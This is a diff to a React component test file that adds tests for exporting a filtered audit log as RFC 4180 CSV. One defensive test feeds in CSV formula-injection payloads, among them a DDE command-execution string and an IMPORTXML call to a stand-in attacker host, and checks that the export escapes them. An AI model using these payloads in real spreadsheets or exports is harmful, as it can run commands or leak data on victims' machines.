@@ -1,7 +1,11 @@
 import { Component, type ReactNode } from 'react'
 import { describe, it, expect, vi, beforeEach } from 'vitest'
 import { fireEvent, render, screen, waitFor, within } from '@testing-library/react'
-import AuditLogTimeline, { type AuditLogEntry, type SeverityLevel } from './AuditLogTimeline'
+import AuditLogTimeline, {
+  serializeAuditLogCsv,
+  type AuditLogEntry,
+  type SeverityLevel,
+} from './AuditLogTimeline'
 import { useDensityMode } from '../../hooks/useDensityMode'
 
 vi.mock('../../hooks/useDensityMode')
@@ -432,5 +436,90 @@ describe('detail drawer state transition', () => {
 
     expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
     expect(document.activeElement).toBe(trigger)
+  })
+})
+
+describe('CSV export of filtered audit log', () => {
+  beforeEach(() => {
+    setup('comfortable')
+  })
+
+  it('renders an Export CSV button in both comfortable and compact density modes', () => {
+    const { unmount } = render(<AuditLogTimeline entries={baseEntries} />)
+    expect(screen.getByRole('button', { name: /export csv/i })).toBeInTheDocument()
+    unmount()
+
+    setup('compact')
+    render(<AuditLogTimeline entries={baseEntries} />)
+    expect(screen.getByRole('button', { name: /export csv/i })).toBeInTheDocument()
+  })
+
+  it('serializes only the filtered entries to RFC 4180 CSV on Export CSV click', () => {
+    const createObjectURL = vi.fn(() => 'blob:mock-audit-csv')
+    const revokeObjectURL = vi.fn()
+    const origCreate = window.URL.createObjectURL
+    const origRevoke = window.URL.revokeObjectURL
+    window.URL.createObjectURL = createObjectURL
+    window.URL.revokeObjectURL = revokeObjectURL
+    const clickSpy = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {})
+
+    try {
+      const onExportCsv = vi.fn()
+      render(
+        <AuditLogTimeline
+          entries={baseEntries}
+          filterState={{ query: 'Revenue' }}
+          onExportCsv={onExportCsv}
+        />,
+      )
+
+      expect(screen.getAllByRole('listitem')).toHaveLength(1)
+      fireEvent.click(screen.getByRole('button', { name: /export csv/i }))
+
+      expect(onExportCsv).toHaveBeenCalledTimes(1)
+      const [csv, exportedEntries] = onExportCsv.mock.calls[0]
+      expect(exportedEntries).toHaveLength(1)
+      expect(exportedEntries[0].id).toBe('4')
+      expect(csv).toBe(
+        [
+          'id,timestamp,severity,event,details',
+          '4,2026-07-28T09:00:00Z,,Revenue source connected,Provider: Stripe',
+        ].join('\r\n'),
+      )
+      expect(createObjectURL).toHaveBeenCalledTimes(1)
+      expect(clickSpy).toHaveBeenCalledTimes(1)
+      expect(revokeObjectURL).toHaveBeenCalledWith('blob:mock-audit-csv')
+    } finally {
+      clickSpy.mockRestore()
+      window.URL.createObjectURL = origCreate
+      window.URL.revokeObjectURL = origRevoke
+    }
+  })
+
+  it('escapes formula injection prefixes (=, +, -, @) and RFC 4180 special chars when exporting', () => {
+    const maliciousEntries: AuditLogEntry[] = [
+      {
+        id: 'inj-1',
+        timestamp: '2026-07-28T10:00:00Z',
+        severity: 'critical',
+        event: '=cmd|"/c calc"!A0',
+        details: '+SUM(1,2)',
+      },
+      {
+        id: 'inj-2',
+        timestamp: '2026-07-28T10:01:00Z',
+        severity: 'warn',
+        event: '-2+3',
+        details: '@IMPORTXML("http://evil.example","//a")',
+      },
+    ]
+
+    const csv = serializeAuditLogCsv(maliciousEntries)
+    const lines = csv.split('\r\n')
+    expect(lines).toEqual([
+      'id,timestamp,severity,event,details',
+      'inj-1,2026-07-28T10:00:00Z,critical,"\'=cmd|""/c calc""!A0","\'+SUM(1,2)"',
+      'inj-2,2026-07-28T10:01:00Z,warn,\'-2+3,"\'@IMPORTXML(""http://evil.example"",""//a"")"',
+    ])
   })
 })
